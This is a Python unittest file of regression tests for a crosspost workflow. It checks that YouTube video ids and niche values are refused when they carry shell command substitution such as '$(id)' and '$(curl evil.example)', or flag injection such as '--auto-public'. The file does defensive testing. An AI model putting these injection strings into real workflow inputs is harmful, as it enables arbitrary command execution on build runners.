"""Regression tests for Phase 1 workstream C: workflow input validation.

Covers:
* ``src.input_validation.validate_video_id`` — the defence in depth
  behind the crosspost workflow passing the id via ``env:`` instead of
  interpolating it into ``run:`` (A1).
* ``src.input_validation.validate_niche`` — flag-like niche values
  (``--auto-public``, ``--public``) are refused before they can reach
  any downstream argparse parser (A2).
* ``scripts/auto_crosspost.py`` dispatch behaviour — a malicious
  video_id is refused BEFORE any queue lookup or API call, via both
  the ``--video-id`` flag and the ``VIDEO_ID`` env var the workflow uses.
"""

import contextlib
import importlib.util
import io
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.input_validation import validate_niche, validate_video_id


def _load_auto_crosspost():
    """Load scripts/auto_crosspost.py as a module (scripts/ has no package)."""
    path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                        "scripts", "auto_crosspost.py")
    spec = importlib.util.spec_from_file_location("auto_crosspost_under_test", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class ValidateVideoIdTests(unittest.TestCase):
    def test_valid_ids_accepted(self):
        for good in ("RB38KIarTcg", "dQw4w9WgXcQ", "-Ab_1234567", "AAAAAAAAAAA"):
            self.assertEqual(validate_video_id(good), good)

    def test_command_substitution_refused(self):
        for bad in ("$(id)", "$(id;id)", "`id`", "`whoami`", "$(curl evil.example)"):
            with self.assertRaises(ValueError, msg=bad):
                validate_video_id(bad)

    def test_wrong_length_refused(self):
        for bad in ("", "short", "RB38KIarTc", "RB38KIarTcgX", "dQw4w9WgXcQ1"):
            with self.assertRaises(ValueError, msg=bad):
                validate_video_id(bad)

    def test_illegal_characters_refused(self):
        for bad in ("abc defghij", "abc/defghij", "abc?defghij", "abc=defghij",
                    "RB38KIarTcg\n", " RB38KIarTcg"):
            with self.assertRaises(ValueError, msg=repr(bad)):
                validate_video_id(bad)

    def test_non_string_refused(self):
        for bad in (None, 12345678901, ["RB38KIarTcg"], b"RB38KIarTcg"):
            with self.assertRaises(ValueError, msg=repr(bad)):
                validate_video_id(bad)


class ValidateNicheTests(unittest.TestCase):
    def test_normal_niches_accepted(self):
        self.assertEqual(validate_niche("history mysteries"),
                         "history mysteries")
        self.assertEqual(
            validate_niche("history mysteries investigated with modern tech"),
            "history mysteries investigated with modern tech")
        # Surrounding whitespace is stripped, value kept.
        self.assertEqual(validate_niche("  history mysteries  "),
                         "history mysteries")

    def test_empty_means_no_explicit_niche(self):
        self.assertEqual(validate_niche(""), "")
        self.assertEqual(validate_niche("   "), "")

    def test_flag_like_values_refused(self):
        for bad in ("--auto-public", "--public", "--publish-at-peak",
                    "--niche", "-x", "--", "  --auto-public  "):
            with self.assertRaises(ValueError, msg=repr(bad)):
                validate_niche(bad)

    def test_control_characters_refused(self):
        for bad in ("history\nmysteries", "history\x00mysteries"):
            with self.assertRaises(ValueError, msg=repr(bad)):
                validate_niche(bad)

    def test_non_string_refused(self):
        with self.assertRaises(ValueError):
            validate_niche(None)


class AutoCrosspostDispatchTests(unittest.TestCase):
    def setUp(self):
        self.module = _load_auto_crosspost()
        self._saved_env = dict(os.environ)

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self._saved_env)

    def test_malicious_video_id_refused_before_queue_lookup(self):
        # No queue file exists in this repo state, and no credentials are
        # set: if validation ran AFTER the queue lookup, the error would
        # be "queue file not found". Validation must fire first, with
        # exit code 1 and an "invalid YouTube video id" message.
        err = io.StringIO()
        with contextlib.redirect_stderr(err), self.assertRaises(SystemExit) as ctx:
            self.module.main(["--video-id", "$(id)"])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("invalid YouTube video id", err.getvalue())
        self.assertNotIn("queue", err.getvalue())

    def test_malicious_video_id_via_env_var_refused(self):
        # The workflow's route: VIDEO_ID env var, no --video-id flag.
        os.environ["VIDEO_ID"] = "`id`"
        err = io.StringIO()
        with contextlib.redirect_stderr(err), self.assertRaises(SystemExit) as ctx:
            self.module.main([])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("invalid YouTube video id", err.getvalue())

    def test_valid_video_id_passes_validation_reaches_queue(self):
        # A well-formed id must get PAST validation: with no queue file
        # present the failure is the queue lookup (exit 1, queue message),
        # not a validation error. That proves validation lets good ids
        # through and only good ids reach the queue.
        os.environ.pop("VIDEO_ID", None)
        err = io.StringIO()
        with contextlib.redirect_stderr(err), self.assertRaises(SystemExit) as ctx:
            self.module.main(["--video-id", "RB38KIarTcg"])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("queue", err.getvalue())
        self.assertNotIn("invalid YouTube video id", err.getvalue())

    def test_valid_video_id_via_env_var_reaches_queue(self):
        os.environ["VIDEO_ID"] = "RB38KIarTcg"
        err = io.StringIO()
        with contextlib.redirect_stderr(err), self.assertRaises(SystemExit) as ctx:
            self.module.main([])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("queue", err.getvalue())
        self.assertNotIn("invalid YouTube video id", err.getvalue())

    def test_missing_video_id_is_usage_error(self):
        os.environ.pop("VIDEO_ID", None)
        err = io.StringIO()
        with contextlib.redirect_stderr(err), self.assertRaises(SystemExit) as ctx:
            self.module.main([])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("usage", err.getvalue())


if __name__ == "__main__":
    unittest.main()
